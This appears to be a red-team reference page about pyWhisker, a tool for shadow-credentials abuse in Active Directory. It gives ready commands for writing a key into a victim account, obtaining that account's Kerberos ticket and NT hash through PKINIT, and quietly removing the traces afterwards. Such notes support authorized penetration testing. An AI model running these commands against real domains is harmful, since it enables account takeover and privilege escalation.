# pyWhisker

**Tags:** `#pywhisker` `#shadowcredentials` `#keycredentiallink` `#pkinit` `#activedirectory` `#privesc`

Linux/Python port of Whisker — abuses **shadow credentials**. With `GenericWrite`/`GenericAll` over a target user or computer, pyWhisker writes a key pair into the target's `msDS-KeyCredentialLink` attribute; that key can then be used with PKINIT to obtain a TGT (and the NT hash via UnPAC-the-hash) **as the target**, with no password change and no ADCS enrollment. Cleaner than a password reset — reversible and quiet.

**Source:** https://github.com/ShutdownRepo/pywhisker
**Install:** `pipx install pywhisker` (needs a Windows Server 2016+ DC for KeyCredentialLink support).

**Actions (`-a`/`--action`):** `list` (default) · `add` · `remove` (needs `-D <device-id>`) · `clear` · `info` · `export` · `import` · `spray`.
**Auth:** `-p <pass>` · `-H [LM:]NT` (pass-the-hash) · `-k` (Kerberos) · or cert (`-crt`/`-key`). Target via `-t/--target` (or `-tl` for a list).

```bash
# Add a shadow credential; -e PFX/PEM, -f names the output, -P sets the PFX password
pywhisker.py -d <domain> -u <user> -p <pass> -t <victim> -a add -e PFX -f victim_shadow
# Then get the victim's TGT via PKINIT (PKINITtools)
gettgtpkinit.py -cert-pfx victim_shadow.pfx -pfx-pass <pw> '<domain>/<victim>' victim.ccache

# Enumerate what's already there (note each entry's Device ID for surgical removal)
pywhisker.py -d <domain> -u <user> -p <pass> -t <victim> -a list
```

> [!warning] **Clean up the RIGHT way — don't `clear`.** `--action clear` deletes **every** value in `msDS-KeyCredentialLink`, which will **break a legitimate Windows Hello for Business enrollment** on that account. Instead: `export` the attribute first, `remove` only *your* entry by its Device ID, and `import` to restore if you touched anything else.
> ```bash
> pywhisker.py ... -t <victim> -a export -f kcl_backup.json          # snapshot before you touch it
> pywhisker.py ... -t <victim> -a remove -D <your-device-id>         # surgical: drop only your key
> pywhisker.py ... -t <victim> -a import -f kcl_backup.json          # restore the original attribute
> ```

Consume the resulting cert on Windows with [[Tools/Auth/Rubeus|Rubeus]] (`asktgt /certificate`); PKINIT side via [[Tools/AD/PKINITtools|PKINITtools]] (and recover the NT hash with `getnthash.py`).

---

> [!note] **See also** — [[Services/Active Directory/ACL Abuse|ACL Abuse]] — shadow-credential path for `GenericWrite`/`GenericAll` → passwordless auth as the target.

---

*Created: 2026-09-25*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
